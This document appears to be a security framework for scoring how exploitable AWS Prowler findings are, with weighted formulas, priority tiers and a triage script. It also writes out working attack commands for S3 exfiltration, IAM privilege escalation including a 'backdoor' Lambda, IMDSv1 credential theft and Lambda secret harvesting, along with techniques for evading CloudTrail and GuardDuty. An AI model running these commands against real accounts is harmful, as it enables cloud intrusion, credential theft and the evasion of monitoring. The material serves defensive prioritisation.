# Exploitability Scoring Framework

**Systematic methodology for assessing weaponization potential of AWS Prowler findings.**

## Exploitability Dimensions

### 1. Access Requirements

**What level of access does an attacker need?**

| Level | Access Type | Time to Obtain | Score | Examples |
|-------|-------------|----------------|-------|----------|
| 0 | **None** (Public internet) | Immediate | 5.0 | Public S3, dangling DNS, public EBS snapshots |
| 1 | **Minimal** (Read-only user) | Hours-Days | 4.0 | Lambda environment variables (via `lambda:GetFunction`) |
| 2 | **Standard** (Normal IAM user) | Days-Weeks | 3.0 | IAM policy review, S3 cross-account analysis |
| 3 | **Elevated** (Power user) | Weeks | 2.0 | Create/delete resources, modify security groups |
| 4 | **Administrative** (Admin/root) | Months | 1.0 | Organization-wide controls, account deletion |

**Scoring rule:** Higher access requirements = lower exploitability score

### 2. Technical Complexity

**What skill level is required to exploit?**

| Level | Skill Requirement | Tooling | Score | Examples |
|-------|-------------------|---------|-------|----------|
| 0 | **None** (Browser/curl) | Built-in OS tools | 5.0 | Browse to public S3 URL, query public IP |
| 1 | **Basic** (AWS CLI knowledge) | AWS CLI, boto3 | 4.0 | `aws s3 cp`, `aws lambda get-function` |
| 2 | **Intermediate** (Scripting) | Custom scripts, Pacu | 3.0 | Enumerate permissions, chain API calls |
| 3 | **Advanced** (Tool development) | Custom exploits | 2.0 | Confused deputy exploitation, SSRF chains |
| 4 | **Expert** (Research-level) | Zero-day techniques | 1.0 | Novel privilege escalation, crypto attacks |

**Scoring rule:** Lower skill requirements = higher exploitability score

### 3. Time to Exploit

**How quickly can this be weaponized?**

| Timeframe | Exploit Development | Score | Examples |
|-----------|---------------------|-------|----------|
| **Minutes** | Copy-paste command | 5.0 | `aws s3 ls s3://public-bucket --no-sign-request` |
| **Hours** | Script existing tools | 4.0 | Pacu module execution, enumerate IAM |
| **Days** | Custom tool development | 3.0 | Chain multiple misconfigurations |
| **Weeks** | Novel technique required | 2.0 | Service-specific exploitation |
| **Months** | Research/discovery needed | 1.0 | Zero-day, undocumented behaviors |

**Scoring rule:** Faster exploitation = higher score

### 4. Detection Likelihood

**Will exploitation trigger alerts?**

| Detection | Monitoring Coverage | Score | Examples |
|-----------|---------------------|-------|----------|
| **None** | No logs, no alerts | 5.0 | Public S3 (no AWS credentials), dangling DNS |
| **Minimal** | CloudTrail only | 4.0 | IAM enumeration, S3 ListBucket calls |
| **Low** | Basic GuardDuty | 3.0 | Unusual API calls, credential access patterns |
| **Medium** | Full AWS monitoring | 2.0 | Privilege escalation attempts, assume role |
| **High** | EDR + SOC alerting | 1.0 | Known attack patterns, high-risk operations |

**Scoring rule:** Lower detection = higher exploitability score

**Note:** Prowler checks for monitoring gaps (GuardDuty, CloudTrail) directly correlate to detection likelihood.

## Composite Exploitability Score

**Formula:**

```
Exploitability Score = (Access × 0.30) + (Complexity × 0.25) + (Time × 0.25) + (Detection × 0.20)

Range: 1.0 (Theoretical) to 5.0 (Immediate)
```

**Tiering:**

| Score | Tier | Priority | Remediation SLA |
|-------|------|----------|-----------------|
| 4.5-5.0 | **P0 - Critical** | Immediate | 7 days |
| 3.5-4.4 | **P1 - High** | Urgent | 30 days |
| 2.5-3.4 | **P2 - Medium** | Scheduled | 90 days |
| 1.5-2.4 | **P3 - Low** | Backlog | 180 days |
| 1.0-1.4 | **P4 - Info** | Track | No SLA |

## Check ID → Exploitability Mapping

### P0 - Critical Exploitability (4.5-5.0)

**Direct internet exploitation, no AWS credentials required:**

| Check ID | Access | Complexity | Time | Detection | Score | Attack Vector |
|----------|--------|------------|------|-----------|-------|---------------|
| `s3_bucket_public_access` | 5.0 | 5.0 | 5.0 | 5.0 | **5.0** | `aws s3 ls s3://bucket --no-sign-request` |
| `route53_dangling_ip_subdomain_takeover` | 5.0 | 4.0 | 5.0 | 5.0 | **4.8** | Allocate EIP, point to attacker server |
| `ec2_ebs_public_snapshot` | 5.0 | 4.0 | 4.0 | 5.0 | **4.6** | `aws ec2 create-volume --snapshot-id snap-xxx` |
| `rds_instance_publicly_accessible` | 5.0 | 4.0 | 4.0 | 4.0 | **4.5** | Direct database connection if unencrypted |

**Direct credential theft with minimal AWS access:**

| Check ID | Access | Complexity | Time | Detection | Score | Attack Vector |
|----------|--------|------------|------|-----------|-------|---------------|
| `cloudformation_stack_outputs_find_secrets` | 4.0 | 5.0 | 5.0 | 4.0 | **4.6** | `aws cloudformation describe-stacks` → steal keys |
| `awslambda_function_no_secrets_in_variables` | 4.0 | 5.0 | 5.0 | 4.0 | **4.6** | `aws lambda get-function-configuration` |
| `secretsmanager_secret_not_used_90_days` | 4.0 | 4.0 | 4.0 | 4.0 | **4.0** | Steal unused secrets, low detection risk |

### P1 - High Exploitability (3.5-4.4)

**Privilege escalation paths:**

| Check ID | Access | Complexity | Time | Detection | Score | Attack Vector |
|----------|--------|------------|------|-----------|-------|---------------|
| `iam_policy_allows_privilege_escalation` | 3.0 | 4.0 | 4.0 | 3.0 | **3.6** | 22 known escalation vectors (Rhino Security) |
| `iam_inline_policy_allows_privilege_escalation` | 3.0 | 4.0 | 4.0 | 3.0 | **3.6** | Inline policies harder to audit |
| `iam_role_cross_service_confused_deputy` | 3.0 | 3.0 | 3.0 | 3.0 | **3.0** | Trick service into unauthorized actions |

**Network exposure + compute compromise:**

| Check ID | Access | Complexity | Time | Detection | Score | Attack Vector |
|----------|--------|------------|------|-----------|-------|---------------|
| `ec2_securitygroup_allow_ingress_from_internet_to_any_port` | 4.0 | 4.0 | 3.0 | 3.0 | **3.6** | Direct service exploitation (SSH, RDP, databases) |
| `ec2_instance_imdsv2_enabled` | 3.0 | 4.0 | 4.0 | 3.0 | **3.6** | SSRF → steal instance role credentials |
| `ec2_instance_older_than_specific_days` | 3.0 | 3.0 | 3.0 | 3.0 | **3.0** | Exploit unpatched vulnerabilities (CVEs) |

**Data exfiltration:**

| Check ID | Access | Complexity | Time | Detection | Score | Attack Vector |
|----------|--------|------------|------|-----------|-------|---------------|
| `s3_bucket_level_public_access_block` | 3.0 | 4.0 | 4.0 | 3.0 | **3.6** | Modify bucket policy to public |
| `s3_bucket_cross_account_access` | 3.0 | 3.0 | 3.0 | 3.0 | **3.0** | Exploit overly permissive cross-account policy |

### P2 - Medium Exploitability (2.5-3.4)

**Defense-in-depth gaps (enablers for other attacks):**

| Check ID | Access | Complexity | Time | Detection | Score | Attack Vector |
|----------|--------|------------|------|-----------|-------|---------------|
| `guardduty_is_enabled` | 2.0 | 3.0 | 3.0 | 5.0 | **3.2** | Blindness multiplier - enables all attacks |
| `cloudtrail_multi_region_enabled` | 2.0 | 3.0 | 3.0 | 5.0 | **3.2** | Forensic evidence gaps |
| `s3_bucket_server_access_logging_enabled` | 2.0 | 3.0 | 3.0 | 4.0 | **3.0** | No audit trail for data access |
| `ec2_instance_managed_by_ssm` | 2.0 | 2.0 | 2.0 | 3.0 | **2.2** | Patch management failures |

**Encryption weaknesses:**

| Check ID | Access | Complexity | Time | Detection | Score | Attack Vector |
|----------|--------|------------|------|-----------|-------|---------------|
| `kms_key_rotation_enabled` | 2.0 | 2.0 | 2.0 | 2.0 | **2.0** | Long-term key compromise value |
| `s3_bucket_default_encryption` | 2.0 | 3.0 | 3.0 | 3.0 | **2.8** | Plaintext data storage |

## Exploitation Techniques by Service

### S3 Exploitation

**Hacking The Cloud technique:**
```bash
# Direct S3 object read (bypasses local staging, covert inspection)
aws s3 cp s3://bucket-name/object-key - | grep -i "password"

# No-sign-request for public buckets
aws s3 ls s3://public-bucket --no-sign-request --recursive

# User-Agent manipulation (CloudTrail obfuscation)
export AWS_EXECUTION_ENV="AWS_Lambda_nodejs18.x"
aws s3 cp s3://target-bucket/file.txt -
```

**Prowler checks → S3 exploits:**

| Prowler Check | Exploitation Path | Command |
|---------------|-------------------|---------|
| `s3_bucket_public_access` | Unauthenticated listing/download | `aws s3 sync s3://bucket . --no-sign-request` |
| `s3_bucket_server_access_logging_enabled` (FAIL) | Silent exfiltration | Use S3 without logging, no forensic trail |
| `s3_bucket_default_encryption` (FAIL) | Plaintext data theft | Download unencrypted objects |
| `s3_bucket_cross_account_access` | Cross-account data theft | Assume role or use external account |

### IAM Exploitation

**Privilege Escalation Vectors** (22 known paths from Rhino Security Labs):

1. **CreatePolicyVersion** - Modify existing policy
   ```bash
   aws iam create-policy-version --policy-arn arn:aws:iam::123:policy/MyPolicy \
     --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
     --set-as-default
   ```

2. **AttachUserPolicy** - Attach AdministratorAccess
   ```bash
   aws iam attach-user-policy --user-name limited-user \
     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
   ```

3. **UpdateAssumeRolePolicy** - Modify trust policy
   ```bash
   aws iam update-assume-role-policy --role-name TargetRole \
     --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::attacker:user/me"},"Action":"sts:AssumeRole"}]}'
   ```

4. **PassRole + Lambda** - Create privileged Lambda function
   ```bash
   aws lambda create-function --function-name backdoor \
     --role arn:aws:iam::123:role/AdminRole \
     --runtime python3.11 --handler lambda_function.lambda_handler \
     --zip-file fileb://backdoor.zip
   ```

5. **PassRole + EC2** - Launch instance with privileged role
   ```bash
   aws ec2 run-instances --image-id ami-xxx \
     --instance-type t2.micro \
     --iam-instance-profile Name=AdminInstanceProfile
   ```

**Prowler check mapping:**

| Prowler Check | Escalation Vector | Exploitation |
|---------------|-------------------|--------------|
| `iam_policy_allows_privilege_escalation` | Multiple vectors | Scan policy for dangerous permissions |
| `iam_user_hardware_mfa_enabled` (FAIL) | Password compromise | Brute force/phish credentials, no MFA |
| `iam_root_mfa_enabled` (FAIL) | Root account takeover | Phish root credentials, full control |

### EC2 / Compute Exploitation

**IMDSv1 Credential Theft:**
```bash
# From SSRF or compromised EC2 instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

**Security Group Exploitation:**
```bash
# Identify internet-facing instances with open ports
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" \
  --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,SecurityGroups[].GroupId]'

# Check security group rules
aws ec2 describe-security-groups --group-ids sg-xxx \
  --query 'SecurityGroups[].IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]'
```

**Prowler check mapping:**

| Prowler Check | Exploitation Path | Command |
|---------------|-------------------|---------|
| `ec2_instance_imdsv2_enabled` (FAIL) | SSRF → credentials | `curl http://169.254.169.254/...` |
| `ec2_securitygroup_allow_ingress_from_internet_to_any_port` | Direct exploit | Scan ports, exploit services |
| `ec2_instance_older_than_specific_days` | CVE exploitation | Search CVE databases for OS/software |

### Lambda Exploitation

**Environment Variable Secrets:**
```bash
# Steal secrets from Lambda environment variables
aws lambda get-function-configuration --function-name target-function \
  --query 'Environment.Variables' --output json

# Common secret patterns to grep for
grep -E '(KEY|SECRET|PASSWORD|TOKEN|API)' lambda-env-vars.json
```

**Prowler check mapping:**

| Prowler Check | Exploitation | Example |
|---------------|--------------|---------|
| `awslambda_function_no_secrets_in_variables` | Credential theft | API keys, DB passwords in environment |
| `awslambda_function_url_cors_policy` (permissive) | CORS bypass | Cross-origin API abuse |
| `awslambda_function_not_publicly_accessible` (FAIL) | Unauthorized invocation | Invoke Lambda without auth |

## Attack Path Complexity Modifiers

**Chaining reduces per-check exploitability but increases overall risk:**

| Chain Depth | Complexity Modifier | Example |
|-------------|---------------------|---------|
| Single check | ×1.0 (base score) | Public S3 bucket |
| 2 checks | ×0.8 (20% harder) | Unpatched EC2 + open security group |
| 3 checks | ×0.6 (40% harder) | EC2 + IMDSv1 + privilege escalation policy |
| 4+ checks | ×0.4 (60% harder) | Complex multi-stage attack chain |

**However:** Chain impact multiplies. 3 "Medium" findings → "Critical" risk.

## Exploit Development Time Estimates

**Based on Hacking The Cloud / HackTricks techniques:**

| Technique | Development Time | Prerequisites |
|-----------|------------------|---------------|
| Public S3 enumeration | 5 minutes | AWS CLI installed |
| Lambda secret extraction | 15 minutes | AWS CLI, valid credentials |
| IAM privilege escalation | 1-4 hours | Pacu, enumeration complete |
| EC2 IMDSv1 → credential theft | 30 minutes | SSRF vulnerability or EC2 access |
| Confused deputy exploitation | 2-8 hours | Service-specific knowledge |
| Multi-stage attack chain | 1-3 days | Multiple misconfigurations |

## Detection Evasion Techniques

**From Hacking The Cloud:**

1. **User-Agent Spoofing:**
   ```bash
   # Make reconnaissance look like legitimate SDK calls
   export AWS_EXECUTION_ENV="AWS_Lambda_python3.11"
   ```

2. **Slow Reconnaissance:**
   ```bash
   # Rate-limit API calls to avoid GuardDuty threshold detection
   for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
     aws s3 ls --region $region
     sleep 60  # 1 request/minute
   done
   ```

3. **Leverage Existing Sessions:**
   ```bash
   # Use CloudShell for built-in obfuscation
   # API calls appear as legitimate console activity
   ```

**Prowler checks that enable evasion:**

- `guardduty_is_enabled` (FAIL) → No anomaly detection
- `cloudtrail_multi_region_enabled` (FAIL) → Regional blindness
- `cloudwatch_log_group_retention_policy` (short retention) → Evidence destruction

## Scoring Automation

**Bash script for auto-scoring:**

```bash
#!/bin/bash
# prowler-exploitability-score.sh

CSV_FILE="$1"

# Define high-exploitability checks
HIGH_EXPLOIT_CHECKS=(
  "s3_bucket_public_access"
  "cloudformation_stack_outputs_find_secrets"
  "awslambda_function_no_secrets_in_variables"
  "route53_dangling_ip_subdomain_takeover"
  "iam_policy_allows_privilege_escalation"
)

# Extract and score
for check in "${HIGH_EXPLOIT_CHECKS[@]}"; do
  count=$(awk -F';' -v c="$check" '$11==c && $14=="FAIL" {print}' "$CSV_FILE" | wc -l)
  if [ "$count" -gt 0 ]; then
    echo "HIGH EXPLOITABILITY: $check ($count findings)"
  fi
done
```
